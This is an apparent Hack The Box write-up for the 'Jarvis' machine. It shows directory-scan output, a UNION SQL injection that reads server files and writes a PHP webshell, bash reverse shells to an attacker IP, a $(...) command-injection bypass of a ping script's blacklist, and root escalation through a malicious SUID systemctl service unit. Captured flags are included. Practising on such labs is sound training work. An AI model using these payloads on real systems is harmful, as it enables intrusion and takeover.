200      GET        9l       78w     5382c http://supersecurehotel.htb/fonts/flaticon/font/Flaticon.woff
200      GET      543l     1653w    23628c http://supersecurehotel.htb/index.php
200      GET     1671l     4509w    46821c http://supersecurehotel.htb/js/bootstrap-datepicker.js
301      GET        9l       28w      336c http://supersecurehotel.htb/phpmyadmin/js => http://supersecurehotel.htb/phpmyadmin/js/
200      GET       94l      534w    42816c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.woff
301      GET        9l       28w      337c http://supersecurehotel.htb/phpmyadmin/tmp => http://supersecurehotel.htb/phpmyadmin/tmp/
200      GET       79l      333w     2985c http://supersecurehotel.htb/phpmyadmin/js/multi_column_sort.js
200      GET       16l       61w      495c http://supersecurehotel.htb/phpmyadmin/js/server_plugins.js
200      GET      110l      279w     4127c http://supersecurehotel.htb/phpmyadmin/js/server_variables.js
200      GET       92l      211w     3154c http://supersecurehotel.htb/phpmyadmin/js/replication.js
200      GET      149l      458w     5695c http://supersecurehotel.htb/phpmyadmin/js/server_databases.js
200      GET      222l      789w     8318c http://supersecurehotel.htb/phpmyadmin/js/menu-resizer.js
200      GET      187l      568w     6122c http://supersecurehotel.htb/phpmyadmin/js/server_status_processes.js
200      GET       59l      142w     1749c http://supersecurehotel.htb/phpmyadmin/js/page_settings.js
200      GET      101l      332w     3264c http://supersecurehotel.htb/phpmyadmin/js/shortcuts_handler.js
200      GET      365l     1062w    20643c http://supersecurehotel.htb/phpmyadmin/js/doclinks.js
200      GET      288l    13959w   108738c http://supersecurehotel.htb/fonts/bootstrap/glyphicons-halflings-regular.svg
200      GET      503l     1520w    19866c http://supersecurehotel.htb/phpmyadmin/js/tbl_structure.js
200      GET        9l       28w      289c http://supersecurehotel.htb/phpmyadmin/js/export_output.js
200      GET      100l      271w     3262c http://supersecurehotel.htb/phpmyadmin/js/server_status_variables.js
200      GET       34l       82w      934c http://supersecurehotel.htb/phpmyadmin/js/server_status_queries.js
200      GET       46l       92w     1577c http://supersecurehotel.htb/phpmyadmin/js/tbl_find_replace.js
200      GET       59l      186w     2525c http://supersecurehotel.htb/phpmyadmin/js/u2f.js
200      GET       14l       60w      471c http://supersecurehotel.htb/phpmyadmin/js/cross_framing_protection.js
200      GET      427l     1442w    15803c http://supersecurehotel.htb/phpmyadmin/js/db_structure.js
200      GET      293l     1998w   170022c http://supersecurehotel.htb/images/blog-1.jpg
200      GET      309l      882w    10112c http://supersecurehotel.htb/phpmyadmin/js/error_report.js
200      GET        1l        5w       37c http://supersecurehotel.htb/phpmyadmin/js/whitelist.php
200      GET      365l     1160w    10949c http://supersecurehotel.htb/phpmyadmin/js/tbl_gis_visualization.js
200      GET      239l      823w    10952c http://supersecurehotel.htb/phpmyadmin/js/db_central_columns.js
200      GET       79l      208w     2198c http://supersecurehotel.htb/phpmyadmin/js/db_qbe.js
200      GET       17l       42w      477c http://supersecurehotel.htb/phpmyadmin/js/transformations/json_editor.js
200      GET       28l       85w      834c http://supersecurehotel.htb/phpmyadmin/js/transformations/image_upload.js
200      GET       11l       33w      312c http://supersecurehotel.htb/phpmyadmin/js/transformations/sql_editor.js
200      GET       18l       64w      670c http://supersecurehotel.htb/phpmyadmin/js/transformations/json.js
200      GET       18l       64w      665c http://supersecurehotel.htb/phpmyadmin/js/transformations/xml.js
200      GET      413l     1204w    15807c http://supersecurehotel.htb/phpmyadmin/js/tbl_select.js
200      GET      253l      746w    10191c http://supersecurehotel.htb/phpmyadmin/js/db_multi_table_query.js
200      GET       41l       98w     1373c http://supersecurehotel.htb/phpmyadmin/js/server_user_groups.js
200      GET      160l      491w     5373c http://supersecurehotel.htb/phpmyadmin/js/designer/page.js
200      GET       15l       46w      386c http://supersecurehotel.htb/phpmyadmin/js/designer/objects.js
200      GET       67l      146w     2003c http://supersecurehotel.htb/phpmyadmin/js/designer/init.js
200      GET      866l     2681w    26929c http://supersecurehotel.htb/phpmyadmin/js/config.js
200      GET      172l      414w    89411c http://supersecurehotel.htb/images/loader.gif
200      GET      136l      376w     4311c http://supersecurehotel.htb/phpmyadmin/js/designer/database.js
200      GET      394l     1561w    14721c http://supersecurehotel.htb/phpmyadmin/js/gis_data_editor.js
200      GET      423l     1158w    14129c http://supersecurehotel.htb/phpmyadmin/js/tbl_chart.js
200      GET      758l     2353w    27409c http://supersecurehotel.htb/phpmyadmin/js/indexes.js
200      GET      628l     1917w    22336c http://supersecurehotel.htb/phpmyadmin/js/tbl_zoom_plot_jqplot.js
200      GET      855l     3121w    28527c http://supersecurehotel.htb/phpmyadmin/js/designer/history.js
200      GET      550l     1782w    19168c http://supersecurehotel.htb/phpmyadmin/js/common.js
200      GET      244l      745w     8950c http://supersecurehotel.htb/phpmyadmin/js/tbl_relation.js
200      GET      335l     1342w    11594c http://supersecurehotel.htb/phpmyadmin/js/microhistory.js
200      GET      323l      989w    14117c http://supersecurehotel.htb/phpmyadmin/js/tbl_operations.js
200      GET     2110l     6289w    74695c http://supersecurehotel.htb/phpmyadmin/js/designer/move.js
200      GET     1654l     4936w    59816c http://supersecurehotel.htb/phpmyadmin/js/navigation.js
200      GET      478l     1316w    18553c http://supersecurehotel.htb/phpmyadmin/js/server_privileges.js
200      GET       16l       38w      412c http://supersecurehotel.htb/phpmyadmin/js/transformations/xml_editor.js
200      GET      729l     1893w    27248c http://supersecurehotel.htb/phpmyadmin/js/normalization.js
200      GET     1077l     4006w    47678c http://supersecurehotel.htb/phpmyadmin/js/rte.js
200      GET     1495l     3977w    57278c http://supersecurehotel.htb/phpmyadmin/js/console.js
200      GET      708l     2663w    29012c http://supersecurehotel.htb/phpmyadmin/js/tbl_change.js
200      GET      834l     3085w    31246c http://supersecurehotel.htb/phpmyadmin/js/ajax.js
200      GET     2283l     7750w    97665c http://supersecurehotel.htb/phpmyadmin/js/makegrid.js
200      GET      246l      718w     8763c http://supersecurehotel.htb/phpmyadmin/js/db_search.js
200      GET      409l     3083w    30285c http://supersecurehotel.htb/phpmyadmin/js/messages.php
200      GET      966l     2557w    33868c http://supersecurehotel.htb/phpmyadmin/js/export.js
200      GET      834l     5305w   456161c http://supersecurehotel.htb/images/img_bg_2.jpg
200      GET      400l     2332w   195987c http://supersecurehotel.htb/images/person3.jpg
200      GET      165l      884w    69495c http://supersecurehotel.htb/images/person1.jpg
301      GET        9l       28w      340c http://supersecurehotel.htb/phpmyadmin/locale => http://supersecurehotel.htb/phpmyadmin/locale/
200      GET      577l     3053w   521715c http://supersecurehotel.htb/images/cover_img_1.jpg
301      GET        9l       28w      343c http://supersecurehotel.htb/phpmyadmin/libraries => http://supersecurehotel.htb/phpmyadmin/libraries/
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/SqlQueryForm.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/classes/Language.php
200      GET       52l      212w     1520c http://supersecurehotel.htb/phpmyadmin/README
301      GET        9l       28w      340c http://supersecurehotel.htb/phpmyadmin/vendor => http://supersecurehotel.htb/phpmyadmin/vendor/
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/libraries/db_table_exists.inc.php
200      GET      543l     1653w    23628c http://supersecurehotel.htb/
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/examples/openid.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/menu.inc.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/setup/frames/config.inc.php
200      GET      101l      316w     3710c http://supersecurehotel.htb/phpmyadmin/js/server_status_advisor.js
200      GET      168l      484w     6359c http://supersecurehotel.htb/phpmyadmin/js/db_operations.js
200      GET      108l      315w     3797c http://supersecurehotel.htb/phpmyadmin/js/tbl_tracking.js
200      GET      676l     2060w    18509c http://supersecurehotel.htb/phpmyadmin/js/chart.js
200      GET       70l      178w     2009c http://supersecurehotel.htb/phpmyadmin/js/server_status_sorter.js
200      GET      155l      496w     5640c http://supersecurehotel.htb/phpmyadmin/js/import.js
200      GET     1012l     3324w    37870c http://supersecurehotel.htb/phpmyadmin/js/sql.js
200      GET       94l      293w     3581c http://supersecurehotel.htb/phpmyadmin/js/db_tracking.js
200      GET      140l      408w     3333c http://supersecurehotel.htb/phpmyadmin/js/keyhandler.js
200      GET     2180l     6778w    85807c http://supersecurehotel.htb/phpmyadmin/js/server_status_monitor.js
301      GET        9l       28w      343c http://supersecurehotel.htb/phpmyadmin/templates => http://supersecurehotel.htb/phpmyadmin/templates/
301      GET        9l       28w      340c http://supersecurehotel.htb/phpmyadmin/themes => http://supersecurehotel.htb/phpmyadmin/themes/
200      GET      211l      951w     7387c http://supersecurehotel.htb/phpmyadmin/js/vendor/sprintf.js
200      GET      754l     2382w    22367c http://supersecurehotel.htb/phpmyadmin/js/vendor/u2f-api-polyfill.js
200      GET     5107l    16854w   173349c http://supersecurehotel.htb/phpmyadmin/js/functions.js
200      GET      339l     2968w    18092c http://supersecurehotel.htb/phpmyadmin/LICENSE
200      GET       28l      449w   821711c http://supersecurehotel.htb/phpmyadmin/js/vendor/zxcvbn.js
200      GET       30l       75w      662c http://supersecurehotel.htb/phpmyadmin/vendor/bin/lint-query
200      GET       21l      168w     1070c http://supersecurehotel.htb/phpmyadmin/vendor/composer/LICENSE
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_classmap.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_files.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_psr4.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_real.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/ClassLoader.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_namespaces.php
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/composer/autoload_static.php
200      GET     1043l     1976w    33174c http://supersecurehotel.htb/phpmyadmin/vendor/composer/installed.json
200      GET      165l      478w     3886c http://supersecurehotel.htb/phpmyadmin/js/vendor/js.cookie.js
200      GET     1277l     5005w    45389c http://supersecurehotel.htb/phpmyadmin/js/vendor/tracekit.js
200      GET        0l        0w        0c http://supersecurehotel.htb/phpmyadmin/vendor/autoload.php
200      GET       29l       75w      666c http://supersecurehotel.htb/phpmyadmin/vendor/bin/highlight-query
[####################] - 26s    90911/90911   0s      found:378     errors:101    
[####################] - 25s    30000/30000   1188/s  http://supersecurehotel.htb/ 
[####################] - 8s     30000/30000   3968/s  http://supersecurehotel.htb/images/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   6145/s  http://supersecurehotel.htb/fonts/flaticon/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   681818/s http://supersecurehotel.htb/fonts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   389610/s http://supersecurehotel.htb/fonts/flaticon/license/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   6163/s  http://supersecurehotel.htb/fonts/flaticon/font/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   67416/s http://supersecurehotel.htb/fonts/icomoon/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 5s     30000/30000   6019/s  http://supersecurehotel.htb/fonts/bootstrap/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 22s    30000/30000   1342/s  http://supersecurehotel.htb/phpmyadmin/ 
[####################] - 7s     30000/30000   4273/s  http://supersecurehotel.htb/phpmyadmin/libraries/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   370370/s http://supersecurehotel.htb/phpmyadmin/templates/ => Directory listing (add --scan-dir-listings to scan)
```

Tested /phpadmin panel for sql injection attack vectors. But couldn't find anything.

On the main webpage, when viewing the rooms there is an another parameter called ?cod=1, this seems to be vulnerable, because the room image wasn't displayed anymore. It broke the default query.

```
http://supersecurehotel.htb/room.php?cod=1'-- -
```

Let's perform an union attack manually 

```
/room.php?cod=1 order by 1
```

Incremented the order by 1 with 1 until 8, the default query broke and didn't provide us the room image anymore. Which means the query runs 7 columns.

Now let's check which of those columns are injectable.


```
/room.php?cod=0 union select 1,2,3,4,5,6,7
```

The images didn't get displayed, but it displayed us which of the columns are still getting displayed.
2,3,4 & 5 were reflected, 3 got even displayed in the price tag $ 3 / per night, which before was 270 $ / each night.

Let's enumerate the database running & also the user which is running the default query.

```
/room.php?cod=-1 union select 1,database(),user(),4,5,6,7
```

database --> hotel
user --> DBadmin

There is an sql function which allows us to view files called load_file()

```
/room.php?cod=0 union select 1,load_file('/etc/passwd'),3,4,5,6,7
```

This reflected all users on the target server.

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false pepper:x:1000:1000:,,,:/home/pepper:/bin/bash mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
```

Let's enumerate where the webroot is configured on the apache2 server (usually /var/www/html) but let's confirm. The apache configuration file is usually stored in 

```
/room.php?cod=-1 union select 1,load_file('/etc/apache2/sites-enabled/000-default.conf'),3,4,5,6,7
```

This provides with following information

```
# The ServerName directive sets the request scheme, hostname and port that
	# the server uses to identify itself. This is used when creating
	# redirection URLs. In the context of virtual hosts, the ServerName
	# specifies what hostname must appear in the request's Host: header to
	# match this virtual host. For the default virtual host (this file) this
	# value is not decisive as it is used as a last resort host regardless.
	# However, you must set it for any further virtual host explicitly.
	#ServerName www.example.com

	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	# Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
	# error, crit, alert, emerg.
	# It is also possible to configure the loglevel for particular
	# modules, e.g.
	#LogLevel info ssl:warn

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
	DirectoryIndex index.php
	# For most configuration files from conf-available/, which are
	# enabled or disabled at a global level, it is possible to
	# include a line for only one particular virtual host. For example the
	# following line enables the CGI configuration for this host only
	# after it has been globally disabled with "a2disconf".
	#Include conf-available/serve-cgi-bin.conf
```

Let's check if we can create files in this directory. (var/www/html)

There is an functionality in MySQL called INTO OUTFILE

```
/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7 into outfile '/var/www/html/hacked.txt'
```

Let's try to display /hacked.txt on the browser and check if the we have file writing permission, this should have the content of /etc/passwd. Since it is the root of the web server, we don't have to specify /var/www/html.

```
http://supersecurehotel.htb/hacked.txt
```

#### Initial Access

It worked, we can write in /var/www/html, now we can utilize creating an webshell in order to get foothold of the target server.

```
/room.php?cod=1 union select 1,'<?php system($_REQUEST["exec"]);?>',3,4,5,6,7 into outfile '/var/www/html/pwned.php'
```

We get the following output when sending an POST request to /pwned.php, which means the exec parameter we created actually works. We can now execute commands on the server.

```
curl -X POST http://supersecurehotel.htb/pwned.php --data-urlencode exec=whoami
1       www-data
        3       4       5       6       7
```

Embedded my rev shell script into exec parameter and started up my listener using netcat on port 1337.

```
curl -X POST http://supersecurehotel.htb/pwned.php --data-urlencode 'exec=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.186/1337 0>&1"'
```
```
nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.229.137] 33880
bash: cannot set terminal process group (608): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jarvis:/var/www/html$
```

User www-data is able to run simpler.py script with sudo rights as user pepper.

```
www-data@jarvis:/var/www/Admin-Utilities$ sudo -l
sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py

```

Let's analyze the script and check for possible bypasses.


```
#!/usr/bin/env python3
from datetime import datetime
import sys
import os
from os import listdir
import re

def show_help():
    message='''
********************************************************
* Simpler   -   A simple simplifier ;)                 *
* Version 1.0                                          *
********************************************************
Usage:  python3 simpler.py [options]

Options:
    -h/--help   : This help
    -s          : Statistics
    -l          : List the attackers IP
    -p          : ping an attacker IP
    '''
    print(message)

def show_header():
    print('''***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************
''')

def show_statistics():
    path = '/home/pepper/Web/Logs/'
    print('Statistics\n-----------')
    listed_files = listdir(path)
    count = len(listed_files)
    print('Number of Attackers: ' + str(count))
    level_1 = 0
    dat = datetime(1, 1, 1)
    ip_list = []
    reks = []
    ip = ''
    req = ''
    rek = ''
    for i in listed_files:
        f = open(path + i, 'r')
        lines = f.readlines()
        level2, rek = get_max_level(lines)
        fecha, requ = date_to_num(lines)
        ip = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if fecha > dat:
            dat = fecha
            req = requ
            ip2 = i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3]
        if int(level2) > int(level_1):
            level_1 = level2
            ip_list = [ip]
            reks=[rek]
        elif int(level2) == int(level_1):
            ip_list.append(ip)
            reks.append(rek)
        f.close()

    print('Most Risky:')
    if len(ip_list) > 1:
        print('More than 1 ip found')
    cont = 0
    for i in ip_list:
        print('    ' + i + ' - Attack Level : ' + level_1 + ' Request: ' + reks[cont])
        cont = cont + 1

    print('Most Recent: ' + ip2 + ' --> ' + str(dat) + ' ' + req)

def list_ip():
    print('Attackers\n-----------')
    path = '/home/pepper/Web/Logs/'
    listed_files = listdir(path)
    for i in listed_files:
        f = open(path + i,'r')
        lines = f.readlines()
        level,req = get_max_level(lines)
        print(i.split('.')[0] + '.' + i.split('.')[1] + '.' + i.split('.')[2] + '.' + i.split('.')[3] + ' - Attack Level : ' + level)
        f.close()

def date_to_num(lines):
    dat = datetime(1,1,1)
    ip = ''
    req=''
    for i in lines:
        if 'Level' in i:
            fecha=(i.split(' ')[6] + ' ' + i.split(' ')[7]).split('\n')[0]
            regex = '(\d+)-(.*)-(\d+)(.*)'
            logEx=re.match(regex, fecha).groups()
            mes = to_dict(logEx[1])
            fecha = logEx[0] + '-' + mes + '-' + logEx[2] + ' ' + logEx[3]
            fecha = datetime.strptime(fecha, '%Y-%m-%d %H:%M:%S')
            if fecha > dat:
                dat = fecha
                req = i.split(' ')[8] + ' ' + i.split(' ')[9] + ' ' + i.split(' ')[10]
    return dat, req

def to_dict(name):
    month_dict = {'Jan':'01','Feb':'02','Mar':'03','Apr':'04', 'May':'05', 'Jun':'06','Jul':'07','Aug':'08','Sep':'09','Oct':'10','Nov':'11','Dec':'12'}
    return month_dict[name]

def get_max_level(lines):
    level=0
    for j in lines:
        if 'Level' in j:
            if int(j.split(' ')[4]) > int(level):
                level = j.split(' ')[4]
                req=j.split(' ')[8] + ' ' + j.split(' ')[9] + ' ' + j.split(' ')[10]
    return level, req

def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

if __name__ == '__main__':
    show_header()
    if len(sys.argv) != 2:
        show_help()
        exit()
    if sys.argv[1] == '-h' or sys.argv[1] == '--help':
        show_help()
        exit()
    elif sys.argv[1] == '-s':
        show_statistics()
        exit()
    elif sys.argv[1] == '-l':
        list_ip()
        exit()
    elif sys.argv[1] == '-p':
        exec_ping()
        exit()
    else:
        show_help()
        exit()
```

## Lateral Movement

The script itself has poor blacklisting of characters in the exec_ping() function.
We can still use $(/tmp/shell.sh) for example.
Let's try and upload an bash reverse shell and ping the script to execute it, to get RCE as user pepper.

On my local machine created an file called shell.sh and pasted the following bash rev shell inside it.

```
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.14.186/8888 0>&1'
```

Started up my listener on port 8888


```
nc -lvnp 8888
```

Ran script with sudo rights as user pepper and prompted $(/tmp/shell.sh) to execute the script as user pepper.

```
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(/tmp/shell.sh)
bash: connect: Connection refused
bash: /dev/tcp/10.10.14.186/8888: Connection refused
Usage: ping [-aAbBdDfhLnOqrRUvV64] [-c count] [-i interval] [-I interface]
            [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos]
            [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
            [-w deadline] [-W timeout] [hop1 ...] destination
Usage: ping -6 [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
             [-l preload] [-m mark] [-M pmtudisc_option]
             [-N nodeinfo_option] [-p pattern] [-Q tclass] [-s packetsize]
             [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline]
             [-W timeout] destination
www-data@jarvis:/tmp$ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
***********************************************
     _                 _                       
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _ 
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/ 
                                @ironhackers.es
                                
***********************************************

Enter an IP: $(/tmp/shell.sh)
```

Gained RCE as user "pepper".


```
nc -lvnp 8888                    
listening on [any] 8888 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.229.137] 45386
bash: cannot set terminal process group (608): Inappropriate ioctl for device
bash: no job control in this shell
pepper@jarvis:/tmp$
```

Retrieved user.txt in /home/pepper directory.

```
5cf7fd57b548564241478b0043ee07c2
```


Checked for SUID Binaries and found an unusual binary "systemctl".

```
find / -perm /4000 2>/dev/null
```

Checking up on gtfobins, we have an PoC for systemctl binary with SUID.


```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "id > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
```

It creates an service which creates an file in the tmp directory called output which displays root's id.

Let's change this slightly, I tried to do it in the /tmp directory, but smth blocks it so we will do it in the root directory of user pepper /home/pepper. Also let's execute an revshell script instead of id.

Paste the following content in the shell when ur in /home/pepper directory.

```
echo '[UNIT]
Description=shell
[Service]
Type=oneshot
ExecStart=/home/pepper/shell2.sh
[Install]
WantedBy=multi-user.target' > shell.service
```

Create a new revshell script on ur target machine.


```
#!/bin/bash

/bin/bash .c 'bash -i >& /dev/tcp/10.10.14.186/9999 0>&1'
```

Start up ur python server on ur local machine and on target download the file into /home/pepper

```
wget http://10.10.14.186/shell2.sh
```

now symlink the service using systemctl.

```
systemctl link /home/pepper/shell.service
```

Start up your listener on port 9999 on ur local machine

```
nc -lvnp 9999
```

enable the script to be run by systemctl.

```
systemctl enable --now /home/pepper/shell.service
```

Gained root shell.

```
nc -lvnp 9999                    
listening on [any] 9999 ...
connect to [10.10.14.186] from (UNKNOWN) [10.129.229.137] 53944
bash: cannot set terminal process group (7701): Inappropriate ioctl for device
bash: no job control in this shell
root@jarvis:/#
```

Retrieved root.txt in /root directory.


```
bd5ae43cfbebed5259b648415f9eddfc
```
